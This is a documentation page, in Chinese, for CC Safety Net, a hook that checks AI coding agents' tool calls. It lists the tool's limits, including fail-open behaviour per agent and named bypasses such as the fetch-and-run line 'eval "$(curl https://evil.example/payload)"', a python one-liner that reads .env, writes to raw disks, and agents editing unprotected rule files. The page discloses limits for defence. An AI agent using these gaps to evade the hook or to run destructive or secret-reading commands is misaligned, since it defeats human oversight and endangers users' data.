## CC Safety Net 无法防护哪些情况？

CC Safety Net 在受支持的工具调用运行前检查它们。它不隔离进程，也没有网络层，因此无法阻止数据经网络外泄。它保护的是它能识别的凭证文件，以及你添加的拒绝路径。它看不到二进制文件内部的行为，绕过已安装集成的命令也完全不会被检查。如果要应对数据外泄、不可信代码或需要完整隔离，请同时使用[沙箱](/zh-Hans/guides/vs-sandboxing)或操作系统权限。

面对对抗性或动态输入，standard 模式只提供尽力保护。下文有几项属于放宽，[strict 或 paranoid 模式](/zh-Hans/configuration/modes)会将其关闭，本页会在相应位置说明。

## 各智能体的限制

CC Safety Net 自身无法完成分析时，每个集成都会阻止该调用。但 hook 进程崩溃、超时或无法启动，或者插件加载失败时会怎样，由智能体决定。下表根据各智能体的文档或源码，列出截至 2026 年 10 月的行为。“放行该调用”意味着 hook 坏掉后什么也保护不了。

| 智能体 | hook 崩溃或超时时 | 未覆盖的范围 |
| --- | --- | --- |
| [Amp Code](/zh-Hans/installation/amp-code#amp-code-coverage-limits) | CC Safety Net 出错时阻止。插件崩溃或未加载时的行为没有文档说明 | CC Safety Net 放行后又被其他插件改写的输入 |
| [Antigravity CLI](/zh-Hans/installation/antigravity-cli#what-the-antigravity-cli-hook-checks) | 阻止该调用 | 只有 `run_command` 和 `manage_task` 的 `send_input` 会按命令分析 |
| [Claude Code](/zh-Hans/installation/claude-code#when-claude-code-asks-you-instead-of-blocking) | 放行该调用（fail-open） | 在 `standard` 下，两种无法验证的拒绝会改为批准提示 |
| [Codex](/zh-Hans/installation/codex#codex-coverage-limits) | 放行该调用（fail-open） | 在运行中的会话里输入的文本，以及调用的 `workdir` |
| [Cursor](/zh-Hans/installation/cursor#what-the-cursor-hook-checks) | 阻止该调用（`failClosed: true`） | 只有 `Shell` 调用会按命令分析 |
| [DeepSeek Harness](/zh-Hans/installation/deepseek-harness#deepseek-harness-coverage-limits) | 防护出错时阻止。bundle 加载失败时，该 profile 不受检查 | `web` 和 `desktop` 以外的 profile、PTC 模式下的 `run_code`、`terminal_send` |
| [Devin CLI](/zh-Hans/installation/devin-cli#devin-cli-coverage-limits) | 放行该调用（fail-open） | 项目 `.devin/hooks.v1.json` 中的 hook、拆分到多次 `write_to_process` 调用中的命令、Devin Cloud |
| [Factory Droid](/zh-Hans/installation/factory-droid#factory-droid-coverage-limits) | 放行该调用（fail-open） | `allowManagedHooksOnly` 开启期间的一切。`Task`、`Loop` 和自动化工具未经验证 |
| [Gemini CLI](/zh-Hans/installation/gemini-cli) | 崩溃、超时或输出无效时放行该调用。缺少 `npx` 或 `node` 时阻止 | 没有记录在案的智能体特有缺口 |
| [GitHub Copilot CLI](/zh-Hans/installation/github-copilot-cli) | 崩溃或 hook 无法启动时阻止。超时或输出无效时放行该调用 | 没有记录在案的智能体特有缺口 |
| [Grok Build](/zh-Hans/installation/grok-build#what-the-grok-build-hook-checks) | 放行该调用（fail-open） | hook 失败且没有任何输出时，调用会照常运行 |
| [Hermes Agent](/zh-Hans/installation/hermes-agent#hermes-agent-coverage-limits) | 阻止该调用 | `terminal`、`read_file`、`write_file` 和 `patch` 以外的工具、`!command` 输入、Windows |
| [Kimi Code](/zh-Hans/installation/kimi-code#kimi-code-coverage-limits) | 放行该调用（fail-open） | `kimi web` 和 ACP 会话中的会话目录 |
| [OpenClaw](/zh-Hans/installation/openclaw#openclaw-coverage-limits) | 出错时阻止。插件加载失败时，`exec` 不受检查 | 文件工具和 `apply_patch`、工作区之外的会话目录、`openclaw agent exec`、Windows |
| [OpenCode](/zh-Hans/installation/opencode#opencode-coverage-limits) | 出错时阻止。插件加载失败时，工具不受检查 | OpenCode 1.x 在 Windows 上以 POSIX 根路径表示的 `workdir` |
| [Pi](/zh-Hans/installation/pi#what-the-pi-extension-checks) | 出错时阻止。`/reload` 期间加载失败时，Pi 不受检查 | 名为 `Shell` 的自定义命令工具 |

## 命令分析限制

### 二进制文件内部行为

命令分析只能看到命令文本。`some-tool --task destructive-cleanup` 看起来是无害的，因为 CC Safety Net 无法检查任意二进制文件在运行时做了什么。这类威胁请改用[沙箱](/zh-Hans/guides/vs-sandboxing)。

### 未配置或不透明的命令代理

代你运行命令的工具（例如 `rtk git reset --hard`），只有在你把它声明为[透明包装器](/zh-Hans/configuration/custom-rules#transparent-wrappers)之后才会被分析。改写或隐藏子命令的代理，即使声明了也无法展开。这两种情况下，只有一项并不完整的 回退文本扫描可能捕获该命令。

### 插件的 shell 工具在声明之前不被分析

CC Safety Net 认识每个受支持智能体自身的 shell 工具，但不认识社区插件添加的那些。它从不解析这类工具的 `command`，因此 `dsh-ops` 插件的 `ops_bash` 执行 `git reset --hard` 会被放行。只有 DeepSeek Harness 会报告这一点，做法是[在每个会话中提示智能体一次](/zh-Hans/installation/deepseek-harness#when-a-plugin-shell-tool-goes-unchecked)。在其他宿主上，没有任何提示告诉你某个 shell 工具未被分析。请把它声明为[社区 shell 工具](/zh-Hans/configuration/custom-rules#community-shell-tools)。

### eval 和动态执行

运行时获取或拼装的代码不在命令文本里，分析看不到它：

```bash
eval "$(curl https://evil.example/payload)"
bash -c "$(cat destructive.sh)"
```

CC Safety Net 会扫描 `bash -c` 和解释器的代码参数，但从远程来源获取或由变量拼接而成的 payload 依然不可见。各级别分别阻止什么，见[生成命令的 eval 与 source](/zh-Hans/reference/blocked-commands#eval-and-source-of-a-generated-command)。

<span id="interpreter-one-liners-have-parsing-gaps"></span>

### 解释器单行命令存在解析缺口

CC Safety Net 会扫描传给 `python`、`node`、`ruby` 和 `perl` 的 `-c` 或 `-e` 的代码。长格式 `--eval`、`--execute`、`--print`、`--require`，以及 `--eval='code'` 这种写法，可能不会被扫描。想一律阻止解释器单行命令（无论使用什么选项），请开启 [paranoid interpreters](/zh-Hans/configuration/modes#interpreter-one-liners-cc_safety_net_paranoid_interpreters=1)。

在 standard 模式下，除 Python 外的所有解释器中，注释里的引号都可能让字符串字面量的起始位置发生偏移。CC Safety Net 会跳过 Python 的 `#` 注释，因此其中的引号和括号不影响扫描。[strict 模式](/zh-Hans/configuration/modes#strict-mode-cc_safety_net_strict=1)不受影响。

[解释器自己执行的根目录或主目录递归删除](/zh-Hans/reference/blocked-commands#recursive-deletes-an-interpreter-runs-itself)按代码文本匹配，因此即使这段调用根本不会执行，例如 `python3 -c "print(\"shutil.rmtree('/')\")"`，也一样会被阻止。

### PowerShell 只按子集读取

CC Safety Net 读取的是 PowerShell 的一个保守子集，而不是完整语言。在 `posix` shell 模式下，`Remove-Item` 规则只在嵌套的 `powershell` 或 `pwsh` `-Command` 脚本中生效。在 `auto` 模式下，`ForEach-Object` 和 `Where-Object` 会切换到 PowerShell 读取器，但它们的别名 `%` 和 `?` 不会。见 [PowerShell 命令](/zh-Hans/reference/blocked-commands#powershell-commands)。

<span id="windows-command-prompt-and-nested-powershell"></span>

### Windows 命令提示符与嵌套 PowerShell

CC Safety Net 用文本检查读取 `cmd /c` 或 `cmd /k` 的命令体，而不是用 cmd 解析器。因此它可能阻止一条什么都不删除的命令，例如 `cmd /c 'echo rmdir /s /q C:\'`。它不会打开命令体运行的批处理文件，也不会对延迟扩展（`!VAR!`）求值。

对嵌套的 `powershell` 或 `pwsh`，CC Safety Net 只读取[嵌套的 PowerShell 脚本](/zh-Hans/reference/blocked-commands#nested-powershell-scripts)中描述的那种形式。用 `-File` 运行或从 stdin 读取的脚本不会被读取，因此无论文件内容是什么，`pwsh -File cleanup.ps1` 都会被放行。

<span id="out-of-scope-protections"></span>

## 超出范围的防护

以下限制需要靠隔离而不是命令分析来解决，[沙箱](/zh-Hans/guides/vs-sandboxing)能覆盖其中大部分。

### 敏感路径的覆盖范围有限

[机密保护](/zh-Hans/reference/secret-protection)阻止读取一组固定的凭证文件，以及你添加的拒绝路径。它不是通用的读取边界：

- 文件名和扩展名都不在列表中的文件，CC Safety Net 识别不出其中的凭证。
- standard 模式允许 `test -f .env` 这类只查元数据的检查，以及一些它视为“提及”而非读取的形式。见 [standard 模式不算作读取的情形](/zh-Hans/reference/secret-protection#what-standard-mode-does-not-count-as-a-read)。strict 和 paranoid 会阻止这些形式。
- standard 模式不会从文件名追踪到后续的读取，因此 `python3 -c "for f in {'.env'}: print(open(f).read())"` 会被放行。strict 会阻止它。
- `policy.json` 中的 `secret_protection.enabled: false` 会关闭整个阶段，拒绝路径也一并失效。

### 没有完整的文件系统隔离

一次拒绝只拦下一次工具调用，并不强制文件系统权限。灾难性规则始终生效，但要获得完整保护，请使用操作系统权限、沙箱或写入代理（write broker）。

<span id="disk-tool-coverage-is-a-named-list"></span>

### 磁盘工具的覆盖是一份具名列表

磁盘规则匹配的是具名命令。CC Safety Net 不分析 `fdisk`、`sfdisk`、`gdisk`、`mkswap`、`blkdiscard` 以及 `diskutil apfs` 的子命令，因此 `fdisk /dev/sda` 会被放行。通过 `dd` 以外的任何方式写入设备同样不在覆盖范围内，所以 `tee /dev/sda` 和 `cp img.raw /dev/sda` 都会运行。重定向规则只读取字面目标，因此 `echo x > $DEV` 会被放行。请为团队使用的工具添加[自定义规则](/zh-Hans/configuration/custom-rules)。

<span id="no-network-layer"></span>

### 没有网络层

CC Safety Net 检查调用时不发出任何网络请求，也不过滤流量。数据外泄、域名允许列表、由提示注入引发的外泄以及容器边界都不在它的范围内。沙箱的网络限制可以覆盖这些。

### 符号链接 TOCTOU 风险

CC Safety Net 在判断 `rm -rf` 目标时会解析符号链接，而 shell 在此之后才运行 `rm`。如果符号链接在这期间被改指向别处，CC Safety Net 无法察觉。任何执行前 hook 都无法弥补这个缺口。想采取更严格的立场，[paranoid rm](/zh-Hans/configuration/modes#rm-check-cc_safety_net_paranoid_rm=1) 会阻止更多递归删除。

### 自定义规则配置不防篡改

只有 `policy.json` 受到保护，智能体无法改动。`rule.json` 和 rulebook 都是普通文件，运行时在每次工具调用时重新读取，因此能写入规则目录的智能体，可以改变下一次调用时执行的内容。对落盘的 `rulebook.json` 所做的编辑不会留下任何记录，并且一直生效，直到下一次 `rule update` 将其覆盖。
